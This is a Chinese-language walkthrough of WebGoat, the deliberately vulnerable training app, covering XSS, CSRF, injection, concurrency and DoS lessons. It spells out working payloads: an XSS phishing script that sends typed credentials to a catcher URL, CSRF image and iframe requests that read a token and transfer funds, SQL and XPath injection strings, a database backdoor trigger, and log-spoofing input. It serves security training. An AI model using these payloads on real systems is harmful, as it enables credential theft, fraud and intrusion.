+<p>Tan＃5 = 4879</p>
+<p><b>登录</b></p>
+</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068458597504.png" src="images/20171001/15068458597504.png" width="554" height="321" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068458597504.png" width="554" height="321" /></p></noscript>
+</p>
+<h1>Buffer Overflows</h1>
+<h2>Off-by-One Overflows（逐个溢出）</h2>
+<p>第一步操作，东西随便填。</p>
+<p>第二步操作，使用burpsuit拦截</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068458702522.png" src="images/20171001/15068458702522.png" width="554" height="215" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068458702522.png" width="554" height="215" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068458742821.png" src="images/20171001/15068458742821.png" width="554" height="176" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068458742821.png" width="554" height="176" /></p></noscript>
+<p>将拦截到数据包发送到intruder</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068458824624.png" src="images/20171001/15068458824624.png" width="554" height="191" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068458824624.png" width="554" height="191" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068458876217.png" src="images/20171001/15068458876217.png" width="554" height="322" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068458876217.png" width="554" height="322" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/1506845892742.png" src="images/20171001/1506845892742.png" width="554" height="534" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/1506845892742.png" width="554" height="534" /></p></noscript>
+<h1>Code Quality（代码质量）</h1>
+<h2>Discover Clues in the HTML（在HTML中发现线索）</h2>
+<p>开发人员在源代码中留下诸如FIXME，TODO，Code Broken，Hack等的信息。 以下是基于表单的身份验证形式的示例。 寻找帮助您登录的线索。    </p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/1506845901909.png" src="images/20171001/1506845901909.png" width="554" height="250" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/1506845901909.png" width="554" height="250" /></p></noscript>
+<h1>Concurrency（并发）</h1>
+<h2>Thread Safety Problems（线程安全问题）</h2>
+<p>用户应该能够利用此Web应用程序中的并发错误，并查看正在尝试同一功能的另一个用户的登录信息。这将需要使用两个浏览器。有效的用户名为&#8217;jeff&#8217;和&#8217;dave&#8217;。    <br />请输入您的用户名以访问您的帐户。    </p>
+<p><b>手速要快！！！打开两个浏览器输入jeff</b></p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068459189439.png" src="images/20171001/15068459189439.png" width="554" height="151" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068459189439.png" width="554" height="151" /></p></noscript>
+<h2>Shopping Cart Concurrency Flaw（购物车并发缺陷）</h2>
+<p>对于此练习，您的任务是利用并发问题，这样可以以更低的价格购买商品。</p>
+<p>A浏览器选择购买</p>
+</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068459254374.png" src="images/20171001/15068459254374.png" width="554" height="248" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068459254374.png" width="554" height="248" /></p></noscript>
+<p></p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068459354201.png" src="images/20171001/15068459354201.png" width="554" height="214" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068459354201.png" width="554" height="214" /></p></noscript>
+<p>B浏览器选择更新</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068459415484.png" src="images/20171001/15068459415484.png" width="554" height="383" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068459415484.png" width="554" height="383" /></p></noscript>
+<p>然后在A浏览器看到可以用较低的钱买价格高的东西</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068459648644.png" src="images/20171001/15068459648644.png" width="554" height="245" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068459648644.png" width="554" height="245" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068459708466.png" src="images/20171001/15068459708466.png" width="554" height="308" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068459708466.png" width="554" height="308" /></p></noscript>
+<h1>Cross-Site Scripting (XSS)</h1>
+<h2>Phishing with XSS（网络钓鱼XSS）</h2>
+<p>本课程是网页如果在网页上发生已知XSS攻击时可能支持网络钓鱼攻击的示例    </p>
+<p>以下是标准搜索功能的示例。</p>
+<p>使用XSS和HTML插入，您的目标是：</p>
+<p>     将html插入该请求凭据</p>
+<p>     添加javascript以实际收集凭据</p>
+<p>     将凭据发送到<a href="http://localhost:8080/WebGoat/catcher?PROPERTY=yes...">http://localhost:8080/WebGoat/catcher?PROPERTY=yes&#8230;</a></p>
+<p>要通过本课程，凭证必须发布到捕获者servlet。</p>
+<p>在输入框输入一下代码</p>
+<p><span style="font-size:10.5pt;"></span></p>
+<pre><code>&lt;script&gt;functionhack(){ alert("Had this been a real attack... Your credentials were juststolen. User Name = " + document.forms[1].user.value + "Password =" + document.forms[1].pass.value); XSSImage=new Image(); XSSImage.src="http://192.168.8.89:8080/WebGoat/catcher?PROPERTY=yes&amp;user="+document.forms[1].user.value+ "&amp;password=" + document.forms[1].pass.value + "";}&lt;/script&gt;&lt;form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This featurerequires account login:&lt;/H3 &gt;&lt;br&gt;&lt;br&gt;EnterUsername:&lt;br&gt;&lt;input type="text" id="user"name="user"&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;inputtype="password" name = "pass"&gt;&lt;br&gt;&lt;inputtype="button" name="login" value="login"onclick="hack()"&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;</code></pre>
+</p>
+<div class="simditor-table">
+<div class="simditor-resize-handle"></div>
+</div>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068459818393.png" src="images/20171001/15068459818393.png" width="554" height="255" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068459818393.png" width="554" height="255" /></p></noscript>
+<h2>LAB: Cross Site Scripting</h2>
+<h2>Stage 1: Stored XSS</h2>
+<p>第一步，先使用tom账号登录（密码：tom）</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068459897425.png" src="images/20171001/15068459897425.png" width="554" height="305" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068459897425.png" width="554" height="305" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068459945155.png" src="images/20171001/15068459945155.png" width="554" height="377" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068459945155.png" width="554" height="377" /></p></noscript>
+<p>第二步，使用HR(密码：jerry）号登录，查看tom的信息</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068460008588.png" src="images/20171001/15068460008588.png" width="554" height="342" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068460008588.png" width="554" height="342" /></p></noscript>
+<p> </p>
+<h2>Stage 2: Block Stored XSS using Input Validation（修复过程略）</h2>
+<h2>Stage 3: Stored XSS Revisited</h2>
+<p>验证Bruce的个人简介中包含有XSS攻击，使用David用户（密码：david）登录，查看Bruce的个人简介，出现弹窗，表明存在XSS攻击。</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068460322436.png" src="images/20171001/15068460322436.png" width="554" height="271" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068460322436.png" width="554" height="271" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068460383203.png" src="images/20171001/15068460383203.png" width="554" height="299" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068460383203.png" width="554" height="299" /></p></noscript>
+<h2>Stage 4: Block Stored XSS using Output Encoding（修复过程略）</h2>
+<p> <span style="color:rgb(38,38,38);font-size:18px;">Stage 5: Reflected XSS</span></p>
+<p>使用用户Larry（密码：larry）登录，在Search Staff搜索框中输入。</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068460584447.png" src="images/20171001/15068460584447.png" width="554" height="382" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068460584447.png" width="554" height="382" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068460634942.png" src="images/20171001/15068460634942.png" width="554" height="353" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068460634942.png" width="554" height="353" /></p></noscript>
+<h2>Stage 6: Block Reflected XSS（修复过程略）</h2>
+<h2>Stored XSS Attacks（存储型XSS）</h2>
+<p>在表单输入&lt;script&gt;alert(0)&lt;/script&gt;    <br /><img alt="Clipboard Image.png" data-original="images/20171001/15068460808576.png" src="images/20171001/15068460808576.png" width="554" height="295" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068460808576.png" width="554" height="295" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068460887015.png" src="images/20171001/15068460887015.png" width="554" height="319" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068460887015.png" width="554" height="319" /></p></noscript>
+<h2>Reflected XSS Attacks（反射型XSS）</h2>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068460999800.png" src="images/20171001/15068460999800.png" width="554" height="315" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068460999800.png" width="554" height="315" /></p></noscript>
+<p><span style="font-size:9pt;color:rgb(0,0,255);">&lt;img </span><span style="font-size:9pt;color:rgb(255,0,0);">src</span><span style="font-size:9pt;color:rgb(0,0,255);">=</span><span style="font-size:9pt;color:rgb(163,21,21);">&#8220;attack?Screen=2078372&amp;menu=900&amp;transferFunds=5000&#8243;</span>    <span style="font-size:9pt;color:rgb(0,0,255);">/&gt;</span>        <br /><img alt="Clipboard Image.png" data-original="images/20171001/15068461046916.png" src="images/20171001/15068461046916.png" width="554" height="322" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068461046916.png" width="554" height="322" /></p></noscript>
+<h2>Cross Site Request Forgery (CSRF)</h2>
+<p>您的目标是向新闻组发送电子邮件。 该电子邮件包含一个图像，其URL指向恶意请求。 在本课中，URL应该指向“攻击”servlet，其中包含课程的“屏幕”和“菜单”参数，以及具有任意数值的额外参数“transferFunds”（如5000）。您可以通过查找“屏幕”来构建链接 “和”菜单“值在右侧的参数插入。 当时通过身份认证的CSRF电子邮件的接收者将转移资金。 当本课程的攻击成功时，左侧菜单中的课程名称旁边会显示一个绿色的勾号。    </p>
+<p><span style="font-size:9pt;color:rgb(0,0,255);"></span></p>
+<pre><code><span style="font-size:9pt;color:#0000FF;">&lt;img </span><span style="font-size:9pt;color:#FF0000;">src</span><span style="font-size:9pt;color:#0000FF;">=</span><span style="font-size:9pt;color:rgb(163,21,21);">"attack?Screen=2078372&amp;menu=900&amp;transferFunds=5000"</span><span style="font-size:9pt;color:#0000FF;">/&gt;</span></code></pre>
+<p><span style="font-size:9pt;color:rgb(0,0,255);"></span>    </p>
+</p>
+<div class="simditor-table">
+<div class="simditor-resize-handle"></div>
+</div>
+<p><img alt="Clipboard Image.png" src="images/20171001/15068461115368.png" width="554" height="233" /><img alt="Clipboard Image.png" data-original="images/20171001/15068461165663.png" src="images/20171001/15068461165663.png" width="554" height="329" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068461115368.png" width="554" height="233" /><img alt="Clipboard Image.png" src="images/20171001/15068461165663.png" width="554" height="329" /></p></noscript>
+<p></p>
+<h2>CSRF Prompt By-Pass</h2>
+<p>类似于CSRF课程，您的目标是向包含多个恶意请求的新闻组发送电子邮件：第一个转移资金，第二个请求确认第一个请求触发的提示。 URL应该使用此CSRF-prompt-by-pass课程的屏幕，菜单参数和具有数字值（例如“5000”）的额外参数“transferFunds”来指向攻击小服务程序，以启动传输和字符串值“CONFIRM” 完成它。 您可以从右侧的插图复制课程参数，创建格式为“attack？Screen = XXX＆menu = YYY＆transferFunds = ZZZ”的网址。 谁收到这封电子邮件，恰好在当时被认证，将有资金转移。    当您认为攻击成功时，刷新页面，您将在左侧菜单中找到绿色检查。    </p>
+<div class="simditor-table">
+<div class="simditor-resize-handle"></div>
+</div>
+<p></p>
+<p><span></span></p>
+<pre><code>&lt;img src="http://192.168.8.89:8080/WebGoat/attack?Screen=227&amp;menu=900&amp;transferFunds=5000" onerror="document.getElementById('image2').src='http://192.168.8.89:8080/WebGoat/attack?Screen=227&amp;menu=900&amp;transferFunds=CONFIRM'"&gt; &lt;imgid="image2"&gt;<br /></code></pre>
+<p></p>
+<p><span style="font-size:10.5pt;"></span>    </p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/1506846122638.png" src="images/20171001/1506846122638.png" width="554" height="281" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/1506846122638.png" width="554" height="281" /></p></noscript>
+<p></p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068461271225.png" src="images/20171001/15068461271225.png" width="554" height="404" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068461271225.png" width="554" height="404" /></p></noscript>
+<h2>CSRF Token By-Pass</h2>
+<p>类似于CSRF课程，您的目标是向包含恶意请求转移资金的新闻组发送电子邮件。 要成功完成，您需要获取有效的请求令牌。 提供转账资金表单的页面包含一个有效的请求令牌。 转移资金页面的URL是本课程的“屏幕”和“菜单”查询参数以及额外的参数“transferFunds = main”的“攻击”servlet。 加载此页面，读取令牌，并在伪造的请求中附加令牌以传输数据。 当您认为攻击成功时，刷新页面，您将在左侧菜单中找到绿色检查。    </p>
+<p></p>
+</p>
+<pre><code>&lt;script&gt;
+
+var readToken = function(){
+
+var doc = document.getElementById("frame1").contentDocument
+
+var token = doc.getElementsByName("CSRFToken")[0].getAttribute("value");
+
+alert(token);
+
+var frame2 = document.getElementById("frame2");
+
+frame2.src = "http://192.168.8.89:8080/WebGoat/attack?Screen=2&amp;menu=900&amp;transferFunds=4000&amp;CSRFToken="+token;
+
+}
+
+&lt;/script&gt;
+
+&lt;iframe id="frame2" &gt;
+
+&lt;/iframe&gt;
+
+&lt;iframe id="frame1" onload="readToken()" src="http://192.168.8.89:8080/WebGoat/attack?Screen=2&amp;menu=900&amp;transferFunds=main" &gt;
+
+&lt;/iframe&gt;<br /></code></pre>
+<p></p>
+</p>
+<div class="simditor-table">
+<div class="simditor-resize-handle"></div>
+</div>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068461354380.png" src="images/20171001/15068461354380.png" width="554" height="252" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068461354380.png" width="554" height="252" /></p></noscript>
+</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068490309301.png" src="images/20171001/15068490309301.png" width="554" height="436" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068490309301.png" width="554" height="436" /></p></noscript>
+<p> </p>
+<h2>HTTPOnly Test</h2>
+<p>为了帮助减轻跨站点脚本威胁，Microsoft已经推出了一个名为“HttpOnly”的新Cookie。 如果设置了此标志，则浏览器不允许客户端脚本访问该cookie。 由于属性相对较新，因此若干浏览器忽略了正确处理新属性。</p>
+<p>有关受支持浏览器的列表，请参阅：OWASP HTTPOnly支持</p>
+<p>一般目标：</p>
+<p>本课的目的是测试您的浏览器是否支持HTTPOnly cookie标志。 注意unique2u cookie的值。 如果您的浏览器支持HTTPOnly，并且您启用Cookie，则客户端代码无法读取或写入该cookie，但浏览器仍可将其值发送到服务器。 某些浏览器只能防止客户端读取访问，但不要阻止写入访问。</p>
+<p>打开HTTPOnly属性后，在浏览器地址栏中输入“javascript：alert（document.cookie）”。 注意除了unique2u cookie之外，所有Cookie都会显示。</p>
+<p></p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068461538296.png" src="images/20171001/15068461538296.png" width="554" height="189" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068461538296.png" width="554" height="189" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068461562392.png" src="images/20171001/15068461562392.png" width="554" height="162" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068461562392.png" width="554" height="162" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/1506846159529.png" src="images/20171001/1506846159529.png" width="554" height="202" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/1506846159529.png" width="554" height="202" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068461634137.png" src="images/20171001/15068461634137.png" width="554" height="189" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068461634137.png" width="554" height="189" /></p></noscript>
+<p></p>
+<h1>Improper Error Handling（不当的错误处理）</h1>
+<h2>Fail Open Authentication Scheme（失败的认证方案）</h2>
+<p>由于认证机制中的错误处理问题，可以在不输入密码的情况下认证为“webgo”用户。 尝试以webgoet用户身份登录，而不指定密码。    </p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068461723193.png" src="images/20171001/15068461723193.png" width="554" height="197" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068461723193.png" width="554" height="197" /></p></noscript>
+<p>删除password参数</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068462237001.png" src="images/20171001/15068462237001.png" width="554" height="196" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068462237001.png" width="554" height="196" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068461886290.png" src="images/20171001/15068461886290.png" width="554" height="115" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068461886290.png" width="554" height="115" /></p></noscript>
+<h1>Injection Flaws</h1>
+<h2>Command Injection（命令注入）</h2>
+<p>命令注入攻击是对任何参数驱动的站点的严重威胁。攻击背后的方法易于学习，造成的损害可能会从相当大的到完全的系统妥协。尽管有这些风险，互联网上的令人难以置信的系统容易受到这种形式的攻击。</p>
+<p>不仅容易引起威胁，而且也是一个威胁，有一点常识和预想，几乎完全可以防止。本课将向学生展示参数注入的几个例子。</p>
+<p>清理所有输入数据，特别是将在OS命令，脚本和数据库查询中使用的数据是一贯的良好做法。</p>
+<p>尝试向操作系统注入一个命令。</p>
+</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068462331000.png" src="images/20171001/15068462331000.png" width="554" height="178" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068462331000.png" width="554" height="178" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068462377520.png" src="images/20171001/15068462377520.png" width="554" height="108" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068462377520.png" width="554" height="108" /></p></noscript>
+<p></p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068462418772.png" src="images/20171001/15068462418772.png" width="554" height="380" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068462418772.png" width="554" height="380" /></p></noscript>
+<h2>Numeric SQL Injection（数字型注入）</h2>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/1506846248648.png" src="images/20171001/1506846248648.png" width="554" height="178" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/1506846248648.png" width="554" height="178" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068462531499.png" src="images/20171001/15068462531499.png" width="554" height="322" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068462531499.png" width="554" height="322" /></p></noscript>
+<h2>Log Spoofing（日志欺骗）</h2>
+<p>*以下灰色区域表示Web服务器的日志文件中将要记录的内容。</p>
+<p>*您的目标是让用户名“admin”成功登录。</p>
+<p>*通过向日志文件添加脚本来提升攻击。</p>
+<p>在输入框输入：Smith%0d%0aLogin Succeeded for username: admin</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068462595449.png" src="images/20171001/15068462595449.png" width="554" height="228" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068462595449.png" width="554" height="228" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068462647171.png" src="images/20171001/15068462647171.png" width="554" height="146" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068462647171.png" width="554" height="146" /></p></noscript>
+<p></p>
+<h2>XPATH Injection</h2>
+<p>下面的表格允许员工查看他们所有的个人资料，包括他们的工资。 您的帐户是Mike / test123。 您的目标是尝试查看其他员工的数据。    </p>
+<p>在用户输入框输入Smith&#8217; or 1=1 or &#8216;a&#8217;='a，密码框随便输入</p>
+</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068462734206.png" src="images/20171001/15068462734206.png" width="554" height="308" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068462734206.png" width="554" height="308" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068462774809.png" src="images/20171001/15068462774809.png" width="554" height="389" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068462774809.png" width="554" height="389" /></p></noscript>
+<p></p>
+<p><span style="color:rgb(38,38,38);font-size:18px;">String SQL Injection（字符串注入）</span>    </p>
+<p>SQL注入攻击是对任何数据库驱动的站点的严重威胁。攻击背后的方法易于学习，造成的损害可能会从相当大的到完全的系统妥协。尽管有这些风险，互联网上的令人难以置信的系统容易受到这种形式的攻击。</p>
+<p>不仅容易引起威胁，还可以轻而易举地预防这种威胁。</p>
+<p>即使以其他方式阻止了SQL注入的威胁，所有的操作都是清理所有输入数据，尤其是在OS命令，脚本和数据库查询中使用的数据。</p>
+<p>一般目标：</p>
+<p>下面的表格允许用户查看他们的信用卡号码。尝试注入一个SQL字符串，导致显示所有信用卡号。尝试用户名“史密斯”。</p>
+<p>现在您已成功执行SQL注入，请尝试对参数化查询进行相同类型的攻击。如果您希望返回到可注入的查询，请重新启动课程。</p>
+<p></p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068462836609.png" src="images/20171001/15068462836609.png" width="554" height="382" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068462836609.png" width="554" height="382" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/1506846289165.png" src="images/20171001/1506846289165.png" width="554" height="417" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/1506846289165.png" width="554" height="417" /></p></noscript>
+<p></p>
+<h2>LAB: SQL Injection</h2>
+<h2>Stage 1: String SQL Injection</h2>
+</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068462961559.png" src="images/20171001/15068462961559.png" width="554" height="216" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068462961559.png" width="554" height="216" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068463002839.png" src="images/20171001/15068463002839.png" width="533" height="475" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068463002839.png" width="533" height="475" /></p></noscript>
+<h2>Stage 2: Parameterized Query #1（修复方式：参数化查询）</h2>
+<h2>Stage 3: Numeric SQL Injection</h2>
+<p>使用larry用户登录</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068463281371.png" src="images/20171001/15068463281371.png" width="554" height="373" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068463281371.png" width="554" height="373" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068463331491.png" src="images/20171001/15068463331491.png" width="554" height="209" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068463331491.png" width="554" height="209" /></p></noscript>
+<p>刷新浏览器</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068463384859.png" src="images/20171001/15068463384859.png" width="554" height="443" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068463384859.png" width="554" height="443" /></p></noscript>
+<h2>Stage 4: Parameterized Query #2（修复方式：参数化查询）</h2>
+<h2>Database Backdoors（数据库后面）</h2>
+<p><span style="font-size:11.5pt;"><b>101;update employee set salary=1234567 where userid=101</b></span></p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068463651826.png" src="images/20171001/15068463651826.png" width="554" height="322" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068463651826.png" width="554" height="322" /></p></noscript>
+<p><span style="font-size:11.5pt;"><b>101;create trigger mybackdoor</b></span></p>
+<p><span style="font-size:11.5pt;"><b>before insert on employee foreach row begin update </b></span></p>
+<p><span style="font-size:11.5pt;"><b>employee setemail=&#8217;john@hackme.com&#8217; where userid=new.userid</b></span></p>
+</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068463741109.png" src="images/20171001/15068463741109.png" width="554" height="227" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068463741109.png" width="554" height="227" /></p></noscript>
+<p></p>
+<h2>Blind Numeric SQL Injection（数字型盲注）</h2>
+<p><b>101 AND ((SELECT pin FROM pins WHEREcc_number=&#8217;1111222233334444&#8242;) &gt; 1000 );</b></p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068463821901.png" src="images/20171001/15068463821901.png" width="554" height="191" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068463821901.png" width="554" height="191" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/1506846391269.png" src="images/20171001/1506846391269.png" width="554" height="193" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/1506846391269.png" width="554" height="193" /></p></noscript>
+<p>一直用二分法找到数字是2364</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068463961332.png" src="images/20171001/15068463961332.png" width="554" height="180" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068463961332.png" width="554" height="180" /></p></noscript>
+<h2>Blind String SQL Injection（字符串盲注）</h2>
+<p>101 AND (SUBSTRING((SELECT name FROM pinsWHERE cc_number=&#8217;4321432143214321&#8242;), 1, 1) &lt; &#8216;H&#8217; );</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068464089504.png" src="images/20171001/15068464089504.png" width="554" height="217" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068464089504.png" width="554" height="217" /></p></noscript>
+<p>第二个字符：改成2，以此类推。</p>
+<p>101 AND (SUBSTRING((SELECT name FROM pinsWHERE cc_number=&#8217;4321432143214321&#8242;), 2, 1) &lt; &#8216;H&#8217; );</p>
+<p>答案找到是Jill</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068464145706.png" src="images/20171001/15068464145706.png" width="554" height="223" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068464145706.png" width="554" height="223" /></p></noscript>
+<p> </p>
+<h1>Denial of Service（拒绝服务攻击）</h1>
+<h2>ZipBomb（压缩包炸弹）</h2>
+<p>服务器只接受ZIP文件，在上传后提取它们，并与其一起删除，并提供20 MB的临时存储来处理所有请求，尝试执行DOS攻击，消耗所有临时存储与一个请求</p>
+<p>简单来说，一直上传低于20M的压缩包，把服务器弄崩溃</p>
+<h2>Denial of Service from Multiple Logins</h2>
+<p>先获取所有帐号</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068464243500.png" src="images/20171001/15068464243500.png" width="554" height="237" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068464243500.png" width="554" height="237" /></p></noscript>
+<p>打开三个页面</p>
+</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068464329344.png" src="images/20171001/15068464329344.png" width="554" height="334" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068464329344.png" width="554" height="334" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068464369416.png" src="images/20171001/15068464369416.png" width="554" height="191" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068464369416.png" width="554" height="191" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068464406678.png" src="images/20171001/15068464406678.png" width="554" height="193" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068464406678.png" width="554" height="193" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068464462705.png" src="images/20171001/15068464462705.png" width="554" height="136" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068464462705.png" width="554" height="136" /></p></noscript>
+<p></p>
+<h1>Insecure Communication（不安全的通讯）</h1>
+<h2>Insecure Login（不安全登录）</h2>
+<p>使用调试器看到密码</p>
+</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068464563604.png" src="images/20171001/15068464563604.png" width="554" height="233" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068464563604.png" width="554" height="233" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068464602686.png" src="images/20171001/15068464602686.png" width="554" height="307" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068464602686.png" width="554" height="307" /></p></noscript>
+<p>第二阶段改成https</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/1506846464727.png" src="images/20171001/1506846464727.png" width="554" height="245" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/1506846464727.png" width="554" height="245" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068464722663.png" src="images/20171001/15068464722663.png" width="554" height="265" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068464722663.png" width="554" height="265" /></p></noscript>
+<p></p>
+<h1>Insecure Storage（不安全存储）</h1>
+<h2>Encoding Basics（加密基础）</h2>
